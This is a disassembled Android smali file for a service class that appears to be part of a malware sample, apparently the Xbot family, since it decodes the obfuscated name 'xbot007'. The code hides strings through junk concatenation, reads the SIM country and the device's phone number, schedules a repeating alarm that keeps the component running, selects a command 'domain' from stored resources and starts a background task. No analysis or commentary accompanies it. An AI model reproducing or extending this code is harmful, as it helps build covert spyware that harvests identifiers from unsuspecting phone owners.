.class public Lcom/tujtr/rtbrr/TheSure;
.super Landroid/app/Service;


# static fields
.field static a:Landroid/content/Context;

.field static b:I

.field static c:Landroid/content/SharedPreferences;

.field public static d:Z


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/16 v0, 0xb4

    sput v0, Lcom/tujtr/rtbrr/TheSure;->b:I

    const/4 v0, 0x0

    sput-boolean v0, Lcom/tujtr/rtbrr/TheSure;->d:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Landroid/content/Context;Landroid/content/Intent;)Landroid/app/PendingIntent;
    .locals 3

    const/4 v1, 0x0

    const-string v0, "revso"

    invoke-static {p1, v1, p2, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    const-string v1, "rtheri"

    const-string v2, "oiuyrht"

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    return-object v0
.end method

.method public a(Landroid/content/Context;)Ljava/lang/Object;
    .locals 2

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/tujtr/rtbrr/TheBack;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1, v0}, Lcom/tujtr/rtbrr/TheSure;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/app/PendingIntent;

    move-result-object v0

    return-object v0
.end method

.method public a()Ljava/lang/String;
    .locals 2

    const/4 v1, 0x0

    const-string v0, "phone"

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/TheSure;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    move-result-object v0

    :goto_0
    return-object v0

    :cond_0
    move-object v0, v1

    goto :goto_0
.end method

.method public a(Landroid/telephony/TelephonyManager;)Ljava/lang/String;
    .locals 2

    const-string v0, "rtgovwe"

    const-string v1, "iwe"

    invoke-virtual {v0, v1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    invoke-virtual {p1}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public a(Landroid/app/AlarmManager;JILandroid/app/PendingIntent;)V
    .locals 8

    const/4 v1, 0x0

    const-wide/32 v4, 0xea60

    move-object v0, p1

    move-wide v2, p2

    move-object v6, p5

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    return-void
.end method

.method public a(Landroid/app/AlarmManager;JLandroid/app/PendingIntent;)V
    .locals 6

    sget v0, Lcom/tujtr/rtbrr/TheSure;->b:I

    mul-int/lit16 v4, v0, 0x3e8

    move-object v0, p0

    move-object v1, p1

    move-wide v2, p2

    move-object v5, p4

    invoke-virtual/range {v0 .. v5}, Lcom/tujtr/rtbrr/TheSure;->a(Landroid/app/AlarmManager;JILandroid/app/PendingIntent;)V

    const/4 v0, 0x0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "1"

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    return-void
.end method

.method public b(Landroid/telephony/TelephonyManager;)Ljava/lang/String;
    .locals 2

    const-string v0, ""

    invoke-virtual {p0, p1}, Lcom/tujtr/rtbrr/TheSure;->a(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    return-object v1
.end method

.method public b()V
    .locals 1

    sget-object v0, Lcom/tujtr/rtbrr/TheSure;->a:Landroid/content/Context;

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/TheSure;->c(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    sput-object v0, Lcom/tujtr/rtbrr/TheSure;->c:Landroid/content/SharedPreferences;

    return-void
.end method

.method public b(Landroid/content/Context;)V
    .locals 7

    invoke-virtual {p0, p1}, Lcom/tujtr/rtbrr/TheSure;->a(Landroid/content/Context;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/PendingIntent;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-string v1, "al"

    const-string v4, "ar"

    const-string v5, "m"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v6, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/AlarmManager;

    invoke-virtual {p0, v1, v2, v3, v0}, Lcom/tujtr/rtbrr/TheSure;->a(Landroid/app/AlarmManager;JLandroid/app/PendingIntent;)V

    return-void
.end method

.method public c(Landroid/content/Context;)Landroid/content/SharedPreferences;
    .locals 1

    invoke-static {p1}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 4

    const/4 v3, 0x0

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "%x%b%o%t%0%0%7%"

    const-string v1, "%"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v3}, Lcom/tujtr/rtbrr/TheSure;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    sput-object v0, La/a;->c:Landroid/content/SharedPreferences;

    sget-object v0, La/a;->c:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    sput-object v0, La/a;->d:Landroid/content/SharedPreferences$Editor;

    sget-object v0, La/a;->b:[Ljava/lang/String;

    const v1, 0x7f0b0014

    invoke-virtual {p0, v1}, Lcom/tujtr/rtbrr/TheSure;->getString(I)Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v3

    sget-object v0, La/a;->b:[Ljava/lang/String;

    const/4 v1, 0x1

    const v2, 0x7f0b0015

    invoke-virtual {p0, v2}, Lcom/tujtr/rtbrr/TheSure;->getString(I)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    sget-object v0, La/a;->c:Landroid/content/SharedPreferences;

    const-string v1, "domain"

    invoke-interface {v0, v1, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    sget-object v1, La/a;->b:[Ljava/lang/String;

    aget-object v0, v1, v0

    sput-object v0, La/a;->a:Ljava/lang/String;

    return-void
.end method

.method public onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 4

    const/4 v3, 0x0

    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    sput-object p0, Lcom/tujtr/rtbrr/TheSure;->a:Landroid/content/Context;

    const-string v0, "%x%b%o%t%0%0%7%"

    const-string v1, "%"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v3}, Lcom/tujtr/rtbrr/TheSure;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    sput-object v0, La/a;->c:Landroid/content/SharedPreferences;

    sget-object v0, La/a;->c:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    sput-object v0, La/a;->d:Landroid/content/SharedPreferences$Editor;

    sget-object v0, La/a;->b:[Ljava/lang/String;

    const v1, 0x7f0b0014

    invoke-virtual {p0, v1}, Lcom/tujtr/rtbrr/TheSure;->getString(I)Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v3

    sget-object v0, La/a;->b:[Ljava/lang/String;

    const/4 v1, 0x1

    const v2, 0x7f0b0015

    invoke-virtual {p0, v2}, Lcom/tujtr/rtbrr/TheSure;->getString(I)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    sget-object v0, La/a;->c:Landroid/content/SharedPreferences;

    const-string v1, "domain"

    invoke-interface {v0, v1, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    sget-object v1, La/a;->b:[Ljava/lang/String;

    aget-object v0, v1, v0

    sput-object v0, La/a;->a:Ljava/lang/String;

    invoke-virtual {p0}, Lcom/tujtr/rtbrr/TheSure;->b()V

    new-instance v0, Lcom/tujtr/rtbrr/d;

    invoke-direct {v0, p0}, Lcom/tujtr/rtbrr/d;-><init>(Lcom/tujtr/rtbrr/TheSure;)V

    new-array v1, v3, [Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/tujtr/rtbrr/d;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    invoke-virtual {p0, p0}, Lcom/tujtr/rtbrr/TheSure;->b(Landroid/content/Context;)V

    return-void
.end method

.method public onUnbind(Landroid/content/Intent;)Z
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Service;->onUnbind(Landroid/content/Intent;)Z

    move-result v0

    return v0
.end method
